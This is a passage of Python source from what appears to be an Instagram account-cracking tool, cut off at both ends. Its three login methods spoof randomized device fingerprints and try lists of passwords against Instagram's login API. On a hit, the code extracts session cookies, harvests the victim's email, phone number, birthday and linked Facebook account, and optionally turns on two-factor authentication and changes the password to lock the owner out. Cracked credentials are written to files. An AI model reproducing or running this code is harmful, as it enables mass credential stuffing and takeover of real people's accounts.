'1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733'])
       self.kode = random.choice(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219','119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','197825216','197825127','200395960','179155096','199325907','200396014','188791669','197825133','170693926','200396005','171727780','201577064','201576758','201577192','201775949','201576944','201775970','143631574','126223520','201775951','167338518','144612598','170693940','201775813','200395971','201775744','201775946','202766609','145652094','202766591','202766602','203083142','179155088','202766608','199325884','180322802','202766603','195435547','165030894','201576967','201775904','194383424','197347903','202766610','185203693','201576898','204019468','187682682','204019456','201775901','204019471','204019454','204019458','202766601','204019452','173238721','204019466','148324036','202766581','158441904','201576903','205280538','205280529','201576813','173238729','141753096','205280531','163022072','201576887','163022088','141753091','148324051','205280528','154400383','205280537','201576818','157405371','205858383','201576811','165031093','187682684','145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','239490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','242290370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','245870347','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','253447814','253447807','253447811','253447817','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431','262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397343','267925708','267397327','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182266','271182276','269790798','271182279','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186'])
       self.Andr = random.choice(['28/9','29/10','30/11','31/12'])
       self.apkv = f'{random.randint(100,312)}.{random.randint(1,10)}.0.{random.randint(20,35)}.{random.randint(90,120)}'
       self.ua1 = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; OPPO; PEPM00; OP4ECB; qcom; in_ID; {self.kode})'
       self.ua2 = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; realme; RMX3782; RE5C6CL1; mt6835; in_ID; {self.kode})'
       self.ua3 = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; samsung; GT-I9060I; grandneove3g; sc8830; in_ID)'
       self.ua4 = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; HTC/htc; HTC Desire 616 dual sim; htc_v3_dug; mt6592; in_iD)'
       return(random.choice([self.ua1, self.ua2, self.ua3, self.ua4]))

   def timezone_offset(self):
       self.tim = datetime.datetime.now(pytz.timezone('Asia/Jakarta'))
       self.ofs = self.tim.utcoffset().total_seconds()/60/60
       return self.ofs

   def SetMid(self):
       return '' if len(self.MID) == 0 else random.choice(self.MID)

   def Blok_ID(self):
       self.v23 = 'edf962326770574232e3938baf0c2faebdbb23703933345b000509f560bd9965'
       self.v39 = 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49'
       self.v09 = '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a'
       return(random.choice([self.v09,self.v39,self.v23]))

   # pkg install iproute2
   def UseNet(self):
       #self.net = []
       #for self.y in os.popen('ip neigh show'):self.net.append(self.y)
       #if 'wlan' in str(self.net) or 'wlan0' in str(self.net):return('WIFI','WIFI')
       #else:return('MOBILE.LTE','MOBILE(LTE)')
       return('MOBILE.LTE','MOBILE(LTE)')

   def HeadersApiLogin(self):
       return {
          'host': 'b.i.instagram.com',
          'x-ig-app-locale': 'in_ID',
          'x-ig-device-locale': 'in_ID',
          'x-ig-mapped-locale': 'id_ID',
          'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
          'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
          'x-ig-bandwidth-speed-kbps': '-1.000',
          'x-ig-bandwidth-totalbytes-b': '0',
          'x-ig-bandwidth-totaltime-ms': '0',
          'x-bloks-version-id': self.Blok_ID(),
          'x-ig-www-claim': '0',
          'x-bloks-is-prism-enabled': 'false',
          'x-bloks-is-layout-rtl': 'false',
          'x-ig-device-id': 'b7b95886-a663-41e4-8025-941a72c9ac4d',
          'x-ig-family-device-id': '2ce88cf6-20e8-4b2e-bb67-8d8ed5dda357',
          'x-ig-android-id': 'android-f4d8eb2bd1b86a47',
          'x-ig-timezone-offset': str(self.timezone_offset()),
          'x-fb-connection-type': self.UseNet()[0],
          'x-ig-connection-type': self.UseNet()[1],
          'x-ig-capabilities': '3brTv10=',
          'x-ig-app-id': '567067343352427',
          'priority': 'u=3',
          'user-agent': 'Instagram 275.0.0.27.98 Android (25/7.1.2; 240dpi; 720x1280; Google/google; google Pixel 2; x86; android_x86; in_ID; 458229257)',
          'accept-language': 'id-ID, en-US',
          'x-mid': str(self.SetMid()),
          'ig-intended-user-id': '0',
          'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'content-length': '2702',
          'x-fb-http-engine': 'Liger',
          'x-fb-client-ip': 'True',
          'x-fb-server-cluster': 'True'
       }

   def ChekDuplikat(self, users):
       if str(users) not in self.bugbaru:
          self.bugbaru.append(users)
          return True
       else:
          return False

   def ApiRecovery(self,users, password):
       with requests.Session() as Client:
         try:
             for pwb in password:
                 self.session = requests.Session()
                 self.session.headers.update({**self.HeadersApiLogin(),
                      'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                      'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,300)),
                      'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
                      'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
                      'user-agent': self.AppUac(self.HeadersApiLogin()['x-bloks-version-id']),
                      'x-ig-android-id': 'android-' + str(self.Android_ID(users, pwb).hexdigest()[:16]),
                      'x-ig-family-device-id': str(uuid.uuid4()),
                      'x-ig-device-id': str(uuid.uuid4())})
                 self.DataRec = {'params': '{"client_input_params":{"contact_point":"'+users+'","password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pwb)+'","event_flow":"account_recovery","family_device_id":"'+self.session.headers['x-ig-family-device-id']+'","machine_id":"'+ str(self.session.headers['x-mid']) +'","accounts_list":[],"has_whatsapp_installed":0,"login_attempt_count":1,"device_id":"'+str(self.session.headers['x-ig-android-id'])+'","headers_infra_flow_id":"","auth_secure_device_id":"","encrypted_msisdn":"","device_emails":[],"lois_settings":{"lara_override":"","lois_token":""},"event_step":"AYMH_PASSWORD_FORM","secure_family_device_id":""},"server_params":{"is_caa_perf_enabled":0,"is_platform_login":0,"is_from_logged_out":0,"login_credential_type":"none","should_trigger_override_login_2fa_action":0,"is_from_logged_in_switcher":0,"family_device_id":"'+str(self.session.headers['x-ig-family-device-id'])+'","credential_type":"password","waterfall_id":"'+str(uuid.uuid4())+'","password_text_input_id":"4kv99g:38","layered_homepage_experiment_group":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","INTERNAL__latency_qpl_instance_id":27691536400061,"device_id":"'+str(self.session.headers['x-ig-android-id'])+'","server_login_source":"device_based_login","login_source":"AccountRecovery","caller":"gslr","should_trigger_override_login_success_action":0,"ar_event_source":"first_password_failure","INTERNAL__latency_qpl_marker_id":36707139}}','bk_client_context': '{"bloks_version":"'+str(self.session.headers['x-bloks-version-id'])+'","styles_id":"instagram"}','bloks_versioning_id': str(self.session.headers['x-bloks-version-id'])}
                 self.Query   = 'params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(self.DataRec['params']), urllib.parse.quote(self.DataRec['bk_client_context']), self.DataRec['bloks_versioning_id'])
                 self.Respons = self.session.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=self.Query,allow_redirects=True)
                 self._status = str(self.Respons.status_code)
                 if 'logged_in_user' in self.Respons.text.replace('\\',''):
                    self.Pepek = self.ChekDuplikat(users)
                    if self.Pepek is False:break
                    cokie = {}
                    try:
                        cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(self.Respons.text.replace('\\',''))).group(1)
                        xyz = base64.b64decode(cok.split(':')[2]).decode()
                        ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
                        sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
                        cokie.update({"ds_user_id":f"{ds_id}","sessionid":f"{sn_id}"})
                        cokie.update(self.session.cookies.get_dict())
                        if str(ds_id) in self.CrackDuplikat:break
                        else:self.CrackDuplikat.append(ds_id)
                    except:pass
                    cookie = self.Convert(cokie)
                    akun_info = self.friends_user(cookie)
                    if akun_info is not None:
                       info_email,info_full_nama,info_username,info_nomor_hp,info_birthday,info_followers,info_following = akun_info
                    else:
                       info_followers, info_following, none_postingan = self.friends_user_chek(users)
                       info_email     = ''
                       info_full_nama = ''
                       info_username  = users
                       info_nomor_hp  = ''
                       info_birthday  = ''
                    fbacc = self.Fafo(cookie)
                    akunfb = fbacc
                    if True in self.UbahData:
                       self.a2f = self.TahapPertama2f(cookie)
                       self.cex = 'A2F Di Aktifkan' if self.a2f['success-a2f'] is True else 'A2F Tidak Aktif'
                       self.aut = self.a2f['SecretKey']
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       print(f'''\r                                           
 {P}status       : {H}Success Login
 {P}methode      : {H}Instagram Recovery
 {P}username     : {H}{info_username}
 {P}password     : {H}{self.PWX}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}status a2f   : {H}{self.cex}
 {P}authentikasi : {H}{self.aut}
 {P}pemulihan    : {H}{self.pem}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}Facebook acc : {akunfb}
 {P}cookie       : {H}{cookie}                                               ''')
                    else:
                       print(f'''\r                                                
 {P}status       : {H}Success Login
 {P}methode      : {H}Instagram Recovery
 {P}username     : {H}{info_username}
 {P}password     : {H}{pwb}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}Facebook acc : {akunfb}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}cookie       : {H}{cookie}                                               ''')
                       self.aut = None
                       self.pem = None
                       self.PWX = pwb
                    open('data/OK-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{info_username}|{self.PWX}|{info_followers}|{info_following}|{self.aut}|{self.pem}|{cookie}\n')
                    self.ResultSuccess +=1
                    break
                 elif 'redirection_to_checkpoint' in self.Respons.text.replace('\\',''):
                    followers, following, postingan = self.friends_user_chek(users)
                    print(f'''\r                                
 {P}status       : {K2}Checkpoint
 {P}methode      : {K2}Instagram Recovery
 {P}username     : {K2}{users}
 {P}password     : {K2}{pwb}
 {P}data profile : {K2}{followers}/{following}/{postingan}                                  ''')
                    open('data/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
                    self.ResultChechpoint +=1
                    break
             self.Loop +=1                                      
             _status = '200'
             Console(style=temane[0]).print(f'└──[ code: {_status} logged: {self.ResultSuccess} challenge: {self.ResultChechpoint} hitung: {self.Loop} ]',end='\r')
        #  except Exception as e:print(e)
         except (AttributeError,requests.exceptions.ConnectionError):
             time.sleep(10)

   def ApiThreads(self, users, password):
       global file_ok
       try:
           for pwb in password:
               session = requests.Session()
               session.headers.update({**self.HeadersApiLogin(),
                    'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                    'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,300)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
                    'x-ig-device-id': str(uuid.uuid4()),
                    'x-ig-family-device-id': str(uuid.uuid4()),
                    'x-ig-android-id': 'android-%s'%(self.Android_ID(users,pwb).hexdigest()[:16]),
                    'x-ig-timezone-offset': str(self.timezone_offset()),
                    'x-ig-app-id': '3419628305025917',
                    'user-agent': self.AppUac(self.HeadersApiLogin()['x-bloks-version-id']),
                    # self.HeadersApiLogin()['user-agent'].replace('Instagram','Barcelona')
               })
               passwd  = '#PWD_INSTAGRAM:0:%s:%s'%(int(time.time()), pwb)
               params_ = f'params=%7B%22client_input_params%22%3A%7B%22password%22%3A%22{urllib.parse.quote_plus(passwd)}%22%2C%22contact_point%22%3A%22{str(users)}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22event_flow%22%3A%22login_manual%22%2C%22openid_tokens%22%3A%7B%7D%2C%22machine_id%22%3A%22%22%2C%22family_device_id%22%3A%22{session.headers["x-ig-family-device-id"]}%22%2C%22accounts_list%22%3A%5B%5D%2C%22try_num%22%3A1%2C%22has_whatsapp_installed%22%3A0%2C%22login_attempt_count%22%3A1%2C%22device_id%22%3A%22{session.headers["x-ig-android-id"]}%22%2C%22headers_infra_flow_id%22%3A%22%22%2C%22auth_secure_device_id%22%3A%22%22%2C%22encrypted_msisdn%22%3A%22%22%2C%22sso_token_map_json_string%22%3A%22%22%2C%22device_emails%22%3A%5B%5D%2C%22lois_settings%22%3A%7B%22lara_override%22%3A%22%22%2C%22lois_token%22%3A%22%22%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22event_step%22%3A%22home_page%22%2C%22secure_family_device_id%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22is_caa_perf_enabled%22%3A0%2C%22is_platform_login%22%3A0%2C%22is_from_logged_out%22%3A0%2C%22login_credential_type%22%3A%22none%22%2C%22should_trigger_override_login_2fa_action%22%3A0%2C%22is_from_logged_in_switcher%22%3A0%2C%22family_device_id%22%3A%22{session.headers["x-ig-family-device-id"]}%22%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22credential_type%22%3A%22password%22%2C%22waterfall_id%22%3A%22{str(uuid.uuid4())}%22%2C%22username_text_input_id%22%3A%22u7x8ax%3A58%22%2C%22password_text_input_id%22%3A%22u7x8ax%3A59%22%2C%22layered_homepage_experiment_group%22%3Anull%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A182729300100110%2C%22device_id%22%3A%22{session.headers["x-ig-android-id"]}%22%2C%22server_login_source%22%3A%22login%22%2C%22login_source%22%3A%22Login%22%2C%22caller%22%3A%22gslr%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22ar_event_source%22%3A%22login_home_page%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73'
               session.headers.update({'content-length':str(len(params_))})
               _respon = session.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=params_, allow_redirects =True)
               if 'logged_in_user' in str(_respon.text.replace('\\','')):
                    self.Pepek = self.ChekDuplikat(users)
                    if self.Pepek is False:break
                    cokie = {}
                    try:
                        cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(_respon.text.replace('\\',''))).group(1)
                        xyz = base64.b64decode(cok.split(':')[2]).decode()
                        ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
                        sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
                        cokie.update({"ds_user_id":f"{ds_id}","sessionid":f"{sn_id}"})
                        cokie.update(session.cookies.get_dict())
                    except: pass
                    cookie = self.Convert(cokie)
                    akun_info = self.friends_user(cookie)
                    if akun_info is not None:
                       info_email,info_full_nama,info_username,info_nomor_hp,info_birthday,info_followers,info_following = akun_info
                    else:
                       info_followers, info_following, none_postingan = self.friends_user_chek(users)
                       info_email     = ''
                       info_full_nama = ''
                       info_username  = users
                       info_nomor_hp  = ''
                       info_birthday  = ''
                    fbacc = self.Fafo(cookie)
                    akunfb = fbacc
                    if True in self.UbahData:
                       self.a2f = self.TahapPertama2f(cookie)
                       self.cex = 'A2F Di Aktifkan' if self.a2f['success-a2f'] is True else 'A2F Tidak Aktif'
                       self.aut = self.a2f['SecretKey']
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       print(f'''\r                                                                     
 {P}status       : {H}Success Login
 {P}methode      : {H}Threads
 {P}username     : {H}{info_username}
 {P}password     : {H}{self.PWX}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}status a2f   : {H}{self.cex}
 {P}authentikasi : {H}{self.aut}
 {P}pemulihan    : {H}{self.pem}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}Facebook acc : {akunfb}
 {P}cookie       : {H}{cookie}                                                   ''')
                    else:
                       print(f'''\r                                               
 {P}status       : {H}Success Login
 {P}methode      : {H}Threads
 {P}username     : {H}{info_username}
 {P}password     : {H}{pwb}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}Facebook acc : {akunfb}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}cookie       : {H}{cookie}                                                   ''')
                       self.aut = None
                       self.pem = None
                       self.PWX = pwb
                    open('data/OK-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{info_username}|{self.PWX}|{info_followers}|{info_following}|{self.aut}|{self.pem}|{cookie}\n')
                    self.ResultSuccess +=1
                    break
               elif 'https://i.instagram.com/challenge' in str(_respon.text.replace('\\','')):
                    followers, following, postingan = self.friends_user_chek(users)
                    print(f'''\r                                                        
 {P}status       : {K2}Checkpoint
 {P}methode      : {K2}Threads
 {P}username     : {K2}{users}
 {P}password     : {K2}{pwb}
 {P}data profile : {K2}{followers}/{following}/{postingan}                                             ''')
                    open('data/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
                    self.ResultChechpoint +=1
                    break
           self.Loop +=1
           _status = '200'
           Console(style=temane[0]).print(f'└──[ code: {_status} logged: {self.ResultSuccess} challenge: {self.ResultChechpoint} hitung: {self.Loop} ]',end='\r')
    #    except Exception as e:print(e)
       except (AttributeError,requests.exceptions.ConnectionError):
          time.sleep(10)

   #-> LOGIN APK INSTAGRAM
   def Api(self, users, password):
       global file_ok
       with requests.Session() as Client:
         try:
             for pwb in password:
                 Client.headers.update({**self.HeadersApiLogin(),
                      'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                      'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                      'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,999)),
                      'x-ig-bandwidth-totalbytes-b': str(random.randint(2000,5000)),
                      'x-ig-bandwidth-totaltime-ms': str(random.randint(500,4000)),
                      'x-ig-device-id': str(uuid.uuid4()),
                      'x-ig-android-id': 'android-%s'%(self.Android_ID(users,pwb).hexdigest()[:16]),
                      'x-ig-timezone-offset': str(self.timezone_offset()),
                      'x-ig-app-id': '567067343352427',
                      'user-agent': self.AppUac(self.HeadersApiLogin()['x-bloks-version-id']),
                 })
                 self.payloadIG = 'params={"client_input_params":{"device_id":"'+Client.headers['x-ig-android-id']+'","login_attempt_count":1,"secure_family_device_id":"","machine_id":"'+str(Client.headers['x-mid'])+'","accounts_list":[],"auth_secure_device_id":"","has_whatsapp_installed":0,"password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+pwb+'","sso_token_map_json_string":"","family_device_id":"'+str(uuid.uuid4())+'","fb_ig_device_id":[],"device_emails":[],"try_num":1,"lois_settings":{"lois_token":"","lara_override":""},"event_flow":"login_manual","event_step":"home_page","headers_infra_flow_id":"","openid_tokens":{},"client_known_key_hash":"","contact_point":"'+users+'","encrypted_msisdn":""},"server_params":{"should_trigger_override_login_2fa_action":0,"is_from_logged_out":0,"username_text_input_id":"18g3p8:57","layered_homepage_experiment_group":null,"should_trigger_override_login_success_action":0,"device_id":null,"login_credential_type":"none","server_login_source":"login","waterfall_id":"'+str(uuid.uuid4())+'","login_source":"Login","INTERNAL__latency_qpl_instance_id":7465439600681,"reg_flow_source":"login_home_native_integration_point","is_caa_perf_enabled":1,"is_platform_login":0,"credential_type":"password","caller":"gslr","INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","password_text_input_id":"18g3p8:58","is_from_logged_in_switcher":0,"ar_event_source":"login_home_page"}}&bk_client_context={"bloks_version":"9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a","styles_id":"instagram"}&bloks_versioning_id=9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a'
                 Client.headers.update({'content-length':str(len(self.payloadIG))})
                 self.responsIG = Client.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=self.payloadIG, allow_redirects = True)
                 if 'logged_in_user' in self.responsIG.text.replace('\\',''):
                    self.Pepek = self.ChekDuplikat(users)
                    if self.Pepek is False:break
                    cokie = {}
                    try:
                        cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(self.responsIG.text.replace('\\',''))).group(1)
                        xyz = base64.b64decode(cok.split(':')[2]).decode()
                        ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
                        sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
                        cokie.update({"ds_user_id":f"{ds_id}","sessionid":f"{sn_id}"})
                        cokie.update(self.responsIG.cookies.get_dict())
                    except: pass
                    cookie = self.Convert(cokie)
                    akun_info = self.friends_user(cookie)
                    if akun_info is not None:
                       info_email,info_full_nama,info_username,info_nomor_hp,info_birthday,info_followers,info_following = akun_info
                    else:
                       info_followers, info_following, none_postingan = self.friends_user_chek(users)
                       info_email     = ''
                       info_full_nama = ''
                       info_username  = users
                       info_nomor_hp  = ''
                       info_birthday  = ''
                    fbacc  = self.Fafo(cookie)
                    akunfb = fbacc
                    if True in self.UbahData:
                       self.a2f = self.TahapPertama2f(cookie)
                       self.cex = 'A2F Di Aktifkan' if self.a2f['success-a2f'] is True else 'A2F Tidak Aktif'
                       self.aut = self.a2f['SecretKey']
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       print(f'''\r                                         
 {P}status       : {H}Success Login
 {P}methode      : {H}Instagram Manual
 {P}username     : {H}{info_username}
 {P}password     : {H}{self.PWX}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
